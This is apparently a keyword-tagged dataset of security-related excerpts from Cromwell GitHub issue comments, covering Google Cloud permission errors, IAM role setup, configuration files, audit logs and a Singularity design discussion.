bucket.; ```; I have tried to fix that as follows:; ```; $ gcloud projects add-iam-policy-binding xxx --member serviceAccount:xxx@xxx.gserviceaccount.com --role roles/storage.objects.list; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.list is not supported for this resource.; ```; No luck.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:4851,Access,AccessDeniedException,4851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,3,"['Access', 'access']","['AccessDeniedException', 'access']"
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4154,access,access,4154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5408,access,access,5408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6662,access,access,6662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7916,access,access,7916,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9170,access,access,9170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10424,access,access,10424,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11678,access,access,11678,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12932,access,access,12932,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14186,access,access,14186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," output_bam = ""~{name}.bam""; File output_bai = ""~{name}.bai"". }; }; ```. input:; ```; {; ""Mutect2.tumor_reads"": ""sra://SRR2619134/SRR2619134""; }; ```. wdl:; ```; include required(classpath(""application"")); google {; application-name = ""cromwell""; auths = [; { ; name = ""application-default""; scheme = ""application_default""; }; ]; }; filesystems {; sra {; class = ""cromwell.filesystems.sra.SraPathBuilderFactory""; docker-image = ""fusera/fusera:alpine""; ngc = ""/home/nicholas/.sra/prj_26387_D28121.ngc""; }; }; engine {; filesystems {; gcs {; auth = ""application-default""; }. }; }; backend {; default = PAPIv2; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; concurrent-job-limit = 10000; max-concurrent-workflows = 10000; genomics-api-queries-per-100-seconds = 10000; maximum-polling-interval = 300; max-workflow-launch-count = 2000; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; enable-fuse = true; }; filesystems {; sra {}; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; }; }; }; }; }; system {; input-read-limits {; lines = 12800000; bool = 7; int = 19; float = 50; string = 12800000; json = 12800000; tsv = 12800000; map = 12800000; object = 12800000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161:3631,access,access,3631,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161,1,['access'],['access']
Security," potential there, but mostly because workflow backbones; have complex requirements, and trying to fit a new tool to them that wasn't; made for it in the first place is not trivial. Moving Singularity out of the role of the backend and into the role of a; workflow component, more specifically a container that understands its; data, also introduces the room to give it its own subfunctions, variables,; metadata, tags, etc. This makes the starting point plainly obvious. You can just take the; location where you mention the location of the executable, and put the; wrapper to your singularity image there. I bet this is what most people do; anyway. A next step would be to give it its own section within the workflow; components. Maybe the comment of oneillkza is a high impact one, just; define Singularity as a CAP/ISOblablabla compliant workflow component; within Cromwell. Another take (and not per se mutually exclusive from the take mentioned; above) would be to, again, fix Singularity as a workflow component, and; create a set of options and functions around it that focus on abstraction; of data access etcetera. Very curious where this will go, and thanks so much Vanessa for rethinking; the approach!. Gr. Pim. On Tue, Aug 28, 2018 at 3:12 AM Vanessa Sochat <notifications@github.com>; wrote:. > Hey everyone!; >; > I've been thinking more about this and testing, and I want to offer my; > thoughts here.; > I think overall my conclusions are:; >; > - We are trying to shove Singularity in as a backend *and* a workflow; > component, it's one or the other; > - It's probably more appropriately the latter - a command you would; > put into a workflow (e.g., like python, any binary really) because services; > and standards (OCI) aren't fully developed.; > - The time is soon, but it's not now, to define a Singularity backend; > - For now, give users examples of just using containers as; > executables, nothing special.; >; > TLDR let's not try shoving a dog into a cat hole because the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:1747,access,access,1747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['access'],['access']
Security," request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; requestMetadata:; callerIp: 69.173.70.180; callerSuppliedUserAgent: (gzip),gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T11:58:49.543410910Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T11:58:49.691467944Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T11:58:49.452628092Z'; ```. The principalEmail sometimes is `giulio@broadinst",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:1569,Audit,AuditLog,1569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,2,"['Audit', 'authenticat']","['AuditLog', 'authenticationInfo']"
Security," to plug into Kubernetes,"" etc. The backends for HPC are going to; > be good to go with just a SLURM or SGE backend, and then commands to load; > and run/exec a Singularity container. When the time comes and Singularity; > supports services, then we can start to develop (I think) the singularity; > backend configuration for cromwell, with clean commands to get statuses,; > start and stop, and otherwise integrate into the software. You guys seem; > pretty busy, so likely your best bet would be to just wait, because the; > community is going in that direction anyway.; >; > The other representation is to rethink this. An approach that I like is to; > move away from micro managing the workflow / software, and to set; > requirements for the data. If you set standard formats (meaning everything; > from the organization of files down to the headers of a data file) on the; > data itself, then the software gets built around that. A researcher can; > have confidence that the data he is collecting will work with software; > because it's validated to the format. The developers can have confidence; > their tools will work with data because of that same format. A new graduate; > student knows how to develop a new tool because there are nicely defined; > rules. A good example is to look at the BIDS (brain imaging data structure); > that (has several file formats under it) but it revolutionizing how brain; > imaging analysis is done. (e.g, take a look at https://www.openneuro.org.; > Development of my Thinking; >; > Finally, I want to share how I came to the thinking above. Here are the; > steps that I've taken in the last few weeks, and resulting thoughts from; > them. I started with this issue board actually, and a general goal to ""Add; > Singularity to Cromwell."" Ok.; > Question 1: How do I develop Cromwell?; >; > It first was hard for me to know where to start to develop Cromwell,; > because the docs just went into how to compile it on a host. So it made; > sense to make it eas",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:9132,validat,validated,9132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['validat'],['validated']
Security," xxx.xxxNA:1 failed. Job exited without an error, exit code 0. PAPI error code 9. Please check the log file for more details: xxx; ```; And the log just contains this cryptic message:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]; permissions = [permission for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]. df = pd.DataFrame(dict(roles=roles, permissions=permissions)); df.to_csv(sys.stdout, sep = '\t', header = False, index = False); ```; When running this script, I get:; ```; $ ./roles.py | grep ""lifesciences.workflowsRunner\|iam.serviceAccountUser\|storage.objectAdmin\|storage.objectCreator\|storage.objectViewer"" | column -t; roles/iam.serviceAccountUser iam.serviceAccounts.actAs; roles/iam.serviceAccountUser iam.serviceAccounts.get; roles/iam.serviceAccountUser iam.serv",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:1683,access,access-token,1683,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,1,['access'],['access-token']
